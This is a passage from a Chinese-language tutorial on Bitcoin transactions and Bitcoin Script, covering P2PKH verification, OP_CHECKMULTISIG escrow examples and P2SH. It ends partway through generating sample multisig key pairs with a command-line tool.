<h2 id="交易的语法"><a href="#交易的语法" class="headerlink" title="交易的语法"></a>交易的语法</h2><p>上面从概念上简单介绍了交易。接下来看一些细节——下面的图虽然一眼看上去有点复杂，但是已经是经过翻译之后的友好版本，毕竟所有在网络上传输的数据都是01串。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233006.jpg" alt="img"></p>
<p>hash是上一笔</p>
<p>如上图所示，交易由三部分构成：元数据、输入（多个）和输出（多个）。</p>
<p>元数据：顾名思义，元数据记录交易的基本信息，如交易的大小，交易的输入个数Vin<em>sz，</em>交易的输出个数Voutsz，以及整个交易的哈希值作为交易的唯一的ID。如果看的仔细，还能发现有一个lock_time，锁定时间，在后面会有具体的例子来介绍它的用法。</p>
<p>输入：交易的输入构成一个数组，多个输入中每一个结构都一样。因为它指定了之前的一个交易的输出，所以需要包含之前的交易的哈希值（<strong>哈希指针</strong>），同时指出该输入是之前交易的第几个输出。除此之外，每个输入还必须包括一个签名（scriptSig），这个签名就是一个凭证，证明交易的创建者确实有使用这个输出的权利。</p>
<p>输出：输出同样构成一个数组。每个输出有两个部分，value值和scriptPubkey。所有输出的value的和不能大于所有输入值的和。如果所有输出的和小于所有输入和，那么差值部分就成为矿工的交易费用。</p>
<p>现在可能有个疑问，本来是签名和公钥地址的位置出现的是scriptSig和scriptPubKey，而不是简单的Signature和PubKey。而且在scriptPubkey的地方，有一些奇怪的符号如OP_DUP，OP_Hash等。这就是接下来要介绍的比特币脚本，Bitcoin script。</p>
<p>这里要强调一下，scriptPubkey相当于是一把锁（lock），交易Tx1的创建者（如Alice）指定了只有Bob才能拿走交易Tx1的输出，那么scriptPubkey一定要能够保证确实是Bob才能使用；而Bob在创建交易Tx2的时候也必须提供锁的钥匙，就是scriptSig，证明自己。当然，scriptPubkey的锁可能是各种各样的，可以是特定身份的人；也可以是一个问题的答案，不论是谁，只要回答出来，就可以拿走output。可以看下面的例子。</p>
<h2 id="比特币脚本"><a href="#比特币脚本" class="headerlink" title="比特币脚本"></a>比特币脚本</h2><p>如上小节所见，在交易中出现了一些如OP_DUP的符号，这实际上是一种脚本。本小节将介绍比特币脚本语言，以及为何需要使用比特币脚本。</p>
<p>比特币脚本是基于栈的语言。栈允许两类操作：入栈和出栈。入栈是在栈顶部增加一个项目，出栈则是从栈顶部移除一个项目。脚本语言通过从左至右地处理每个项目的方式执行脚本。数字指令直接入栈，操作指令向堆栈推送（或移除）一个或多个参数，对它们进行处理，或者可以将结果入栈。例如，OP_ADD将从堆栈移除两个项目，将二者相加，然后再将二者相加之和推送到堆栈。</p>
<p>脚本的一个重要作用就是判断是否满足条件，譬如OP_EQUAL判断栈中的两个值是否相等，如果相等则将栈上的两个值出栈，入栈TRUE。如果最后栈的结果为TRUE，则条件满足。举一个非常简单的例子，譬如有钱任性Alice将自己的10个币写在一个交易中，然后加的锁是</p>
<p>3 OP_ADD 5 OP_EQUAL</p>
<p>之后如果有人能够给出满足这个条件的结果，也即最后的OP_EQUAL返回的结果是TRUE，那么则可以使用这10个币。在上面的这个锁中，就没有指定特定的人才能使用这个output，任何人能够提供问题的答案就行。</p>
<p>那么大家看一下，以上问题的结果应该是什么？</p>
<p>这个问题的答案是2。</p>
<p>任何一个人X在自己新创建的交易中的scriptSig中给出2这个答案，就可以使用Alice交易中的输出，也即拿走这10个币。看一下矿工打包的时候的计算过程。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233007.jpg" alt="img"></p>
<p>再举两个例子。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">7   OP_ADD   3   OP_SUB   1   OP_ADD    7    OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>对于上面的scriptPubkey，scriptSig应该是什么？</p>
<p>下面的例子呢？</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_HASH256 6fe28c0ab6f1b372c1a6a246ae63f74f931e8365e15a089c68d6190000000000 OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>最常见的一种比特币交易应该就是通过签名获取之前交易的比特币输出。也即输出中应该指明“这一笔输出应该由这个公钥址所对应的私钥的拥有者使用。”但是回想一下，比特币中，交易地址实际上是公钥的哈希，而不是真正的公钥。因此，矿工并不知道公钥，从而也无法来验证签名。为了进行验证，每一个输出实际上指明的是“这一笔输出可以由哈希为x的公钥，以及公钥对应的私钥的所有者使用。”</p>
<p>为了表达这个含义，来看一下交易中的输出：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233008.jpg" alt="img">Pay-to-PubkeyHash脚本的例子</p>
<p>顾名思义，OP_DUP是duplicate复制，OPHASH160是进行哈希，69e0….串是指定的地址，OP_EQUALVERIFY是验证是否相等，以及OP_CHECKSIG是进行签名验证。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233009.jpg" alt="img"></p>
<p>那现在的问题是，第一个OP_DUP是用来复制什么呢？</p>
<p>答案就是，每一个交易的输入部分的scriptSig也是脚本。为了成功地使用之前交易的输出，我们需要将新交易的输入与之前交易的输出进行合并，然后执行合并之后的脚本，如果验证成功，则该交易是合法的；否则，这个交易就是无效的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233010.jpg" alt="img">新交易的输入签名+之前所引用交易的输出</p>
<p>比特币脚本简称就是Script，它是一种简单的基于栈的编程语言。基于栈意味着每个指令以线性的方式仅仅执行一遍。特别地，比特币脚本中没有循环。因此，脚本的指令的数量就暗示了执行脚本的时间和所用的内存的上限。该语言不是图灵完备的，也即不能执行任意复杂的操作。这也是合理的，因为矿工需要验证交易，也即矿工需要执行这些脚本，如果脚本中出现了死循环，矿工就被坑了。</p>
<p>交易的执行结果要么就是成功的，也即交易是合法的，可以被包括在区块链中；要么就是失败，也即交易是无效的，不能被包括在区块链中。</p>
<p>比特币脚本语言非常小，总共只有256个指令，因为每个指令使用一个字节来表示。其中，有15个指令现在已经禁用；75个预留的，有可能将来添加。大部分的指令是在普通的编程语言中见到的，有一些是和密码学相关的，如哈希，签名验证等。</p>
<p>下面使用一个例子来讲述如何运行脚本。</p>
<p>首先来具体看一下scriptSig的样子。下面是一个例子。</p>
<p>8c4930460221009e0339f72c793a89e664a8a932df073962a3f84eda0bd9e02084a6a9567f75aa022100bd9cbaca2e5ec195751efdfac164b76250b1e21302e51ca86dd7ebd7020cdc0601410450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</p>
<p>它实际上是由四（五）个部分构成：</p>
<p>&lt;One-byte script OPCODE containing the length of the DER-encoded signature plus 1 (the length of the one-byte hash code type)&gt;|&lt; The actual DER-encoded signature plus the one-byte hash code type&gt;|&lt; One-byte script OPCODE containing the length of the public key&gt;|<The actual public key></p>
<p>8c：一个字节指示整个签名（scriptSig）的长度，共140字节</p>
<p>49：一个字节指示实际签名（DER-encoded）的长度（本例中72）加上一个字节的哈希类型SIGHASH_ALL（0x01），共73字节；73&#x3D;72+1</p>
<p>签名：30460221009e0339f72c793a89e664a8a932df073962a3f84eda0bd9e02084a6a9567f75aa022100bd9cbaca2e5ec195751efdfac164b76250b1e21302e51ca86dd7ebd7020cdc06（72字节），然后紧跟着01，sighash类型</p>
<p>41：一个字节指示公钥的长度，共65字节</p>
<p>公钥：0450863ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b23522cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6（65字节）</p>
<p>也即，从新交易的scriptSig中可以获得对应着下图中的第一部分和第二部分。</p>
<p>下图实际上是从左向右逐步执行脚本中每一个指令的过程。上部是栈的变化，下部分是执行的具体指令。</p>
<p>sig和pubKey是两条数据指令，当遇到数据指令时，直接入栈；所以将新交易的输入中的scriptSig部分中的签名部分和公钥部分入栈。后面五条指令中除pubKeyHash外都是操作指令，基于栈的语言从栈顶获得输入，然后将结果入栈。所以第一条Dup复制指令直接把pubkey复制了一份；Hash160指令对pubkey进行哈希，将结果入栈；然后然后接下来是数据指令将新交易所引用的交易的输出中的公钥哈希入栈，然后是比较指令，比较栈顶的两个元素是否相等，如果相等弹出，如果不等则报错。最后是checksig，使用public key来验证签名。如果验证成功，那么栈顶的两个元素出栈，然后结果True入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233011.jpg" alt="img"></p>
<p>现在我们用一个例子再详细地过一遍这个过程。之前的交易Tx1，也即新交易中的输入的来源，我们假设是Alice支付给Bob的交易；新交易Tx2，也即Bob需要使用他在Tx1中获得的币。</p>
<p>为了验证这个交易的合法性，矿工要能够验证Bob确实可以使用Tx1中的输出。如何证明呢？首先就是因为Alice在Tx1交易中的scriptPubKey中，明确指定了一个哈希地址，这个哈希地址就是Bob的公钥的哈希。Bob为了证明自己就是这笔输出的合法主人，他必须提供身份信息，也即，在Tx2的输入部分的scriptSig中他提供了签名和完整的公钥，签名是使用私钥对交易的签名。</p>
<p>然后矿工开始执行验证过程。矿工将Tx2的scriptSig部分和Tx1的scriptPubKey部分简单的拼在一起，然后执行每一条指令。</p>
<p>首先是<sig>指令，这是数据指令，是来自于Bob的签名，也即Tx2的中scriptSig的第一部分，入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233012.jpg" alt="img"></p>
<p>接下来是<pubkey>，同样是数据指令，是来自于Bob的完整公钥，也即Tx2的中scriptSig的第二部分，入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233013.jpg" alt="img"></p>
<p>第三条指令是OP_DUP，这是来自Tx1的Alice的输出的scriptPubKey，OP_DUP添加到堆栈，因为是复制，所以把当前栈顶的数据复制一份放到栈顶，这样把BOB提供的公钥复制了一份。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233014.jpg" alt="img"></p>
<p>第四个指令是OP_HASH160，入栈，对下面的数据，也即Bob的公钥进行两次哈希（SHA-256以及RIPEMD-160），把自己替换掉。这样就获得了Bob公钥的哈希值。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233015.jpg" alt="img"></p>
<p>第五条指令是数据指令，<pubkeyhash>，同样来自于交易Tx1，Alice指定的的输出地址，入栈。这样栈顶就有两份哈希值了。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233016.jpg" alt="img"></p>
<p>下一条指令稍微复杂点，OP_EQUALVERIFY，入栈，相当于展开成EQUAL和VERIFY两个操作。EQUAL的操作是检查它下面的两个值是否相等，这里，也即检查Alice指定的地址（栈顶）和Bob提供的完整公钥生成的哈希（栈顶第二个）是否相等。EQUAL会得到0(false)或者1(true)。VERIFY检查EQUAL的返回值，如果是false，则交易非法，如果是true，则将自己和true出栈。这里，是为true的情况。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233017.jpg" alt="img"></p>
<p>最后一条指令是OP_CHECKSIG入栈，对栈中的两个元素进行检查，当前栈中的数据实际就是Bob的输入中提供的完整公钥和对应私钥的签名，如果验证通过则True入栈。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233018.jpg" alt="img"></p>
<p>以上就是一个正确的Pay-to-PubKeyHash（P2PKH）的例子。</p>
<p>另外要注意一点细节就是如何使用公钥来验证签名。也即，这个签名是怎么产生的？签名是对什么的签名？我们知道签名实际上就是使用私钥对一段明文进行加密，那这里的明文是什么？这里的问题是，首先，这段明文是矿工能够访问的，不然无法验证；其次，<strong>这段明文必须是唯一的，不然Bob之前的签名可能被攻击者复制进行重放。</strong> 要确保这笔交易谁都不法篡改（矿工可能会篡改你的交易内容，把收钱的地址设置为自己的）。</p>
<p>这里答案就是整个交易Tx2。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233019.jpg" alt="img"></p>
<p>确切地说，就是交易Tx2的除了签名部分之外的内容（可以通过标志位对进行签名的交易内容进行简化，在这个例子中，使用pubkey Script替代Signature做填充）。上图共有三个部分，中间是Signed Data，也即被签名的数据。上部是Tx1和Bob自己的数据，下部分是Bob最终形成的Tx2。从上部分和中间部分形成了下部。（签名的另一个好处是，Tx2的明文部分也不能被攻击者随意篡改）</p>
<p>更多细节可以参考<a href="https://link.zhihu.com/?target=https://bitcoin.stackexchange.com/questions/3374/how-to-redeem-a-basic-tx">How to redeem a basic Tx?</a></p>
<p>以及<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/OP_CHECKSIG">OP_CHECKSIG - Bitcoin Wiki</a></p>
<p>最后，有两个问题可以讨论一下：</p>
<ol>
<li>在验证过程中，最后一步OP_CHECKSIG的输入实际上就是在新交易中Bob提供的scriptSig的两个部分，最后一步的验证也就是在验证Bob的私钥。那中间还有那么多步骤能不能省略呢？</li>
</ol>
<p>【一些同学会认为，Bob必须提供一个地址，使得其哈希值等于前交易中指定的值；但是如果这个地址之前使用过，任何人都可以提供这个地址。】</p>
<ol start="2">
<li>在引入比特币地址（公钥的哈希）之前，早期的比特币版本支持p2pk形式的交易，也即pay-to-public-key。这种交易的缺点是需要提前知道公钥，而且针对攻击的保护性较差【如果一个地址只用一次，那么P2PKH的话没有人提前知道公钥】。问题是：这种交易的scriptSig和scriptPubKey应该怎么写？</li>
</ol>
<hr>
<p>关于p2pk和p2pkh，课后有同学问，为啥没有人提前知道公钥会更安全？参考4提供了一个解释：</p>
<p>在比特币使用的椭圆曲线数字签名算法加密系统里面，一个公钥有512位长度，意味着它需要接近100个字符来呈现。举个例子，下面是一个公钥：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">04b52fd5a616a8f08ccad58469102f86fc7891e5aa4262ab8d43e41767c17d45b80850044a62af51783609176daf02fc46221057a8de11ee6ae8743065b27a4b5e</span><br></pre></td></tr></table></figure>

<p>它对应的十六进制形式的比特币地址如下： </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">4b463093e6fc3135a4de2ff577c4b658198777a9</span><br></pre></td></tr></table></figure>

<p>人们更加熟悉的base58编码形式的是： </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1obodiqhAZ3GD9onBXRZ9v7hshkuBreCu</span><br></pre></td></tr></table></figure>

<p>然而，在现实里，有一种以更紧凑的形式编码公钥的方法，只需要257个字节（译者注：这里好像有点问题，应当是257位，参见此文<a href="https://link.zhihu.com/?target=http://618.io/blog/2013/07/30/bitcoin-basic/">http://618.io/blog/2013/07/30/bitcoin-basic/</a>）： </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">03c5c9833d00bed3211a5f3733316ecf6ebc407806d70caa14862f1e2e8c2f852d</span><br></pre></td></tr></table></figure>

<p>如果我们决定把它变成base58编码的形式： </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">15sqRCowBDTfyuxPQD3ba8sN3wBB8MwGbo6gsBEGeKmUbNQADGh</span><br></pre></td></tr></table></figure>

<p>比我们如今使用的地址也没长多少。所以中本聪的选择【p2pkh是中本聪做出的选择】只是带来了不必要的复杂度和浪费吗？</p>
<p>最后证明，答案是否定的。有另外一个非常好的理由去使用这个“公钥的哈希值”的地址结构：量子加密技术。量子计算机可以破解椭圆曲线数字签名算法（也就是说，给定一个公钥，量子计算机可以相当快速的找到对应的私钥），但它们不能相类似的逆转哈希算法（或者说他们可以，但是将需要花掉280个步骤来完成一个比特币地址的破解，这仍然是相当不可行的）。因此，如果你的比特币资金存放在一个你没有支出过的地址里（这意味着公钥是没有公开的），它们在量子计算机面前也就是安全的。有理论上的途径可以让比特币完全免于量子计算机的威胁，但一个地址只是一个公钥的哈希值的事实，意味着一旦量子计算机真的出现了，在我们全面切换之前攻击者可以造成的损失要小得多。</p>
<p>【至于为啥量子计算可以破解ECC但是不能不能逆转哈希，需要进一步的分析了】</p>
<p>参考：</p>
<ol>
<li><p><a href="https://link.zhihu.com/?target=http://8btc.com/article-4382-1.html">深入理解比特币交易的脚本 - 新手入门</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://bitcoin.org/en/developer-guide%23transactions">https://bitcoin.org/en/developer-guide#transactions</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Transaction">Transaction - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://m.8btc.com/article/5340">https://m.8btc.com/article/5340</a></p>
</li>
</ol>
<h1 id="区块链技术8-比特币的机制-2"><a href="#区块链技术8-比特币的机制-2" class="headerlink" title="区块链技术8:比特币的机制(2)"></a>区块链技术8:比特币的机制(2)</h1><h2 id="OP-CHECKMULSIG"><a href="#OP-CHECKMULSIG" class="headerlink" title="OP_CHECKMULSIG"></a>OP_CHECKMULSIG</h2><p>和OP_CHECKSIG相比，OP_CHECKMULSIG多了个MUL，也即它需要检查多个签名。这个指令并不是比特币设计之初就有的，而是在2011年的BIP（bitcoin  improvement protocol）中提出的（详见参考1）。</p>
<p>提出该指令的目的是使能安全钱包、托管交易、以及其他需要多于一个签名的使用情况。举例来说，可以使用的例子包括：</p>
<ul>
<li>使用WPS（wallet protection service）保护的钱包。譬如需要2-of-2的签名的交易，其中一个签名来自于安装了钱包的（可能不安全的）电脑，另一个签名来自WPS。当发送受保护的比特币时，用户的比特币客户端会将交易发给WPS，WPS会向用户请求确认，譬如用户确实发起了这个交易，以及交易的细节是正确的。 Two-factor authentication wallet - One private key is on your primary computer, the other on your smartphone — the funds cannot be spent without a signature from both devices. Thus, an attacker must gain access to both devices in order to steal your funds (much more difficult than one device)。Side note: customers should insist that their wallet protection service provide them with copies of the private key(s) used to secure their wallets that they can safely store off-line, so that their coins can be spent even if the WPS goes out of business。</li>
<li>组织资金使用：2-of-3的情况，由三名董事组成的董事会，为他们的组织维护资金-除非其中两名董事同意，否则不得动用这些资金。 较大的组织可以进行更大的多重签名交易，例如3-of-5, 5-of-9等。</li>
<li>第三方托管服务（买方、卖方、以及信任第三方 Escrow transaction）。适用于需要2-of-3签名的交易。买方、卖方和第三方没人都提供公钥，买方将创建交易，并使用2-of-3 CHECKMULTISIG，然后将交易ID发送给卖方和第三方。卖方履行自己的责任，然后要求买方共同签名，才能获得支付的币。如果买卖双方起了争执，则第三方会参与进来，譬如如果买方收到货却不肯签名，那么第三方将进行签名，这样满足条件，从而卖方可以获得应得的报酬。</li>
</ul>
<p>关于第三方托管的例子，详细来说，譬如Alice想要使用比特币向Bob购买一些物品。问题是，Alice希望在收到物品之后才付钱，而Bob希望收到钱之后才发货。这时候就需要第三方托管（支付宝）。而第三方托管可以通过MultiSig方便地实现。</p>
<p>Alice和Bob同意找到信任的第三方Carol。然后Alice创建了交易。但是这个交易不是直接发给Bob的，而是一个MULTISIG的交易，需要2-of-3的签名。也即，Alice将自己的币发给了一个地址，要求Alice、Bob以及Carol三人中任意两人的签名才能使用这个输出。</p>
<p>这个交易首先是正常的交易，因为Alice确实拥有这个币。然后如果Alice和Bob都是诚实的，也即Bob看到Alice创建的交易之后便发货，而Alice收到货之后也承认收到货，那么为了使用MULTISIG交易中的币，只要Alice和Bob两人签名就可以创建一个新的交易，这个交易的输入是MULTISIG交易中的输出，输出则是Bob的地址，那么Bob就能获得币。此时，并不需要第三方Carol的参与。</p>
<p>如果Alice不诚实，也即收到货了又不承认，此时Bob可以向Coral申请仲裁，如果Coral相信Bob确实发了货，那么Coral可以和Bob两人创建新的交易，将币从MULTISIG交易中赎出，并且输出是Bob的地址。这样Bob也能够获得币。即使Alice想抵赖也不能成功。</p>
<p>如果Bob不诚实，没有发货或者发的货物不对，那么Alice可以向Carol申请仲裁。如果Carol相信了Alice，那么就可以和Alice一起签名，将币从MULTISIG交易中赎出，并且输出是Alice的地址。这样Alice就能够获得退款。即使Bob想抵赖也不能成功。</p>
<p>【此时的Carol既然可以进行仲裁，那么就是一个中心化的机构。那么本质上和支付宝也没什么区别。】</p>
<p>【百度百科上的“去中心化”的描述：去中心化，不是不要中心，而是由节点来自由选择中心、自由决定中心。简单地说，中心化的意思，是中心决定节点。节点必须依赖中心，节点离开了中心就无法生存（类似于没了支付宝就不能用淘宝？）。在去中心化系统中，任何人都是一个节点，任何人也都可以成为一个中心。任何中心都不是永久的，而是阶段性的，任何中心对节点都不具有强制性。】</p>
<p>MULTISIG的规范如下：</p>
<p>scriptPubKey 中包括的内容：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">m &#123;pubkey&#125;...&#123;pubkey&#125; n OP_CHECKMULTISIG</span><br></pre></td></tr></table></figure>

<p>m的值小于或等于n。</p>
<p>OP_CHECKMULTISIG交易赎出币时需要如下的scriptSig:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_0 ...signatures...</span><br></pre></td></tr></table></figure>

<p>这里需要OP_0是因为OP_CHECKMULTISIG中存在Bug，它在实现的时候多出栈了一个元素，所以只好使用OP_0进行填充。</p>
<p>再具体看一下MULTISIG的运行情况。</p>
<p>譬如说赎出币的交易中（新交易Tx2）的scriptSig是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">(sig2)</span><br><span class="line">(sig1)</span><br><span class="line">    0</span><br></pre></td></tr></table></figure>

<p>MultiSig交易（Tx1）中的输出部分的scriptPubKey是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">(pubKey3)</span><br><span class="line">(pubKey2)</span><br><span class="line">(pubKey1)</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>当运行时，在 OP_CHECKMULTISIG执行之前，栈中的数据是这样的：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">(pubKey3)</span><br><span class="line">(pubKey2)</span><br><span class="line">(pubKey1)</span><br><span class="line">2</span><br><span class="line">(sig2)</span><br><span class="line">(sig1)</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>初始化之后，各个变量获得了值：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">ikey-&gt; (pubKey3)</span><br><span class="line">       (pubKey2)</span><br><span class="line">       (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">isig-&gt; (sig2)</span><br><span class="line">       (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>然后首先尝试使用pubKey3来验证sig2, 很明显会失败，那么将ikey朝前走一步指向pubKey2，isig保持不动：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">       (pubKey3)</span><br><span class="line">ikey-&gt; (pubKey2)</span><br><span class="line">       (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">isig-&gt; (sig2)</span><br><span class="line">       (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>使用pubKey2验证sig2成功了，然后ikey和isig都向前:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">n-&gt;    3</span><br><span class="line">       (pubKey3)</span><br><span class="line">       (pubKey2)</span><br><span class="line">ikey-&gt; (pubKey1)</span><br><span class="line">m-&gt;    2</span><br><span class="line">       (sig2)</span><br><span class="line">isig-&gt; (sig1)</span><br><span class="line">       0</span><br></pre></td></tr></table></figure>

<p>基本算法如下：</p>
<ol>
<li>首先弹出n,n是公钥的个数</li>
<li>出栈n个公钥</li>
<li>出栈 m, m是所需的签名的个数</li>
<li>出栈 m个签名</li>
<li>将OP_0出栈（历史遗留问题）</li>
<li>对公钥可以循环，从最上面的开始，对每一个公钥，检查一个签名。都从最上的开始，如果失败，则使用下一个公钥来检查同一个签名；如果成功，则使用下一个公钥来检查下一个签名（签名必须和公钥的顺序相同）。</li>
<li>如果签名成功，则CHECKMULTISIG返回1，否则返回0。</li>
</ol>
<p>以上部分是对MULTISIG的介绍，下面将介绍P2SH，顺便用一下MULTISIG。</p>
<h2 id="P2SH（pay-to-script-hash"><a href="#P2SH（pay-to-script-hash" class="headerlink" title="P2SH（pay-to-script-hash)"></a>P2SH（pay-to-script-hash)</h2><p>之前我们介绍了两种交易类型P2PKH和P2PK，现在来讨论一种新的交易类型，pay-to-script-hash。顾名思义，pay-to-script-hash就是把币发到一个脚本的哈希，而不是公钥或者公钥哈希。</p>
<p>典型的比特币地址长得像<em>15Cytz9sHqeqtKCw2vnpEyNQ8teKtrTPjp</em>，也是Pay-to-PubKeyHash (P2PKH) 的输出脚本中所用的地址。Pay-to-ScriptHash (P2SH) 长的和用的都不一样。典型的P2SH地址像<em>347N1Thc213QqfYCz3PZkjoJpNv5b14kBd</em>，另外，P2SH 总是以3开头的，而P2PKH地址总是以1开头。这是因为P2SH地址的版本前缀是<em>0x05，</em> 而P2PKH的地址前缀是<em>0x00</em>, 在<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Base58Check_encoding">base58check</a>编码中分别生成3和1。</p>
<p>和MULTICHECKSIG一样，P2SH也不是比特币诞生之初就有的，它是2012年的BIP 16中提出的。提出P2SH的目的主要是因为在之前的交易中，都是由发送者负责指定赎出币的条件。这样的话，如果赎出币的过程比较复杂，譬如要使用MULTISIG，那么对付钱的用户，也就是买家，就不够友好。使用P2SH的方式，可以由币的接收方设计好执行的脚本，然后不论脚本多么复杂，发送方只需要将币发送到一个20字节的哈希地址就行。</p>
<p>譬如Alice向Bob购买一件物品，但是Bob的物品不是自己独有的，他需要和其他人一起分享Alice付的币，就例如上面介绍的MULTICHECK，需要3个人中的两人同意才能使用币。把这个任务交给Alice是不合理的，因为Alice只关心自己付了钱能够拿到物品，并不关心Bob拿到钱之后怎么分。这个时候Bob可以创建一个Script，然后Alice可以将币发送到这个Script地址。</p>
<p>我们来看一下P2SH的规范：</p>
<p>在支付用户的交易Tx1中的输出脚本是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">OP_HASH160 [20-byte-hash-value] OP_EQUAL</span><br></pre></td></tr></table></figure>

<p>其中，[20-byte-hash-value]是push-20-bytes-onto-the-stack opcode (0x14) 之后跟着20个字节。考虑到验证时是将Bob的签名脚本+Alice的输出脚本，所以基本上可以猜出，在OP_HASH160之前，栈里应该是Bob提供给Alice的脚本的原文，然后Alice的输出脚本中的SH也入栈，最后是运行OP_EQUAL，判断是否相等。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233020.jpg" alt="img"></p>
<p>然后接收方Bob要提取币的时候，scriptSig的形式应该是:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">...signatures... &#123;serialized script&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233022.jpg" alt="img"></p>
<p>scriptSig首先需要满足Alice的scriptPubKey的要求，也即需要提供一个script原文，使得经过哈希之后的值等于Alice的scriptPubKey中指定的哈希值；另一方面，作为P2SH类型的交易，Bob还必须提供满足脚本本身的条件的signatures。相当于比Alice直接写脚本多了一步。</p>
<p>做一个具体的例子。在这个例子中，P2SH的脚本是一个2-of-3的多签名。</p>
<p>首先Bob需要创建2-of-3 multisig P2SH地址。</p>
<p>为了创建这个地址，首先Bob需要生成3个十六进制的公钥地址。这里使用go-bitcoin-multisig生成3对公私钥对：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">go-bitcoin-multisig keys --count 3 --concise</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">--------------</span><br><span class="line">KEY #1  </span><br><span class="line">Private key:  </span><br><span class="line">5JruagvxNLXTnkksyLMfgFgf3CagJ3Ekxu5oGxpTm5mPfTAPez3  </span><br><span class="line">Public key hex:  </span><br><span class="line">04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">1JzVFZSN1kxGLTHG41EVvY5gHxLAX7q1Rh  </span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line">KEY #2  </span><br><span class="line">Private key:  </span><br><span class="line">5JX3qAwDEEaapvLXRfbXRMSiyRgRSW9WjgxeyJQWwBugbudCwsk  </span><br><span class="line">Public key hex:  </span><br><span class="line">046ce31db9bdd543e72fe3039a1f1c047dab87037c36a669ff90e28da1848f640de68c2fe913d363a51154a0c62d7adea1b822d05035077418267b1a1379790187  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">14JfSvgEq8A8S7qcvxeaSCxhn1u1L71vo4  </span><br><span class="line">--------------</span><br><span class="line">--------------</span><br><span class="line">KEY #3  </span><br><span class="line">Private key:  </span><br><span class="line">5JjHVMwJdjPEPQhq34WMUhzLcEd4SD7HgZktEh8WHstWcCLRceV  </span><br><span class="line">Public key hex:  </span><br><span class="line">0411ffd36c70776538d079fbae117dc38effafb33304af83ce4894589747aee1ef992f63280567f52f5ba870678b4ab4ff6c8ea600bd217870a8b4f1f09f3a8e83  </span><br><span class="line">Public Bitcoin address:  </span><br><span class="line">1Kyy7pxzSKG75L9HhahRZgYoer9FePZL4R  </span><br><span class="line">--------------</span><br></pre></td></tr></table></figure>

<p>这样我们就有了三个十六进制的公钥：</p>
<p>Key A:<br>04a882d414e478039cd5b52a92ffb13dd5e6bd4515497439dffd691a0f12af9575fa349b5694ed3155b136f09e63975a1700c9f4d4df849323dac06cf3bd6458cd </p>
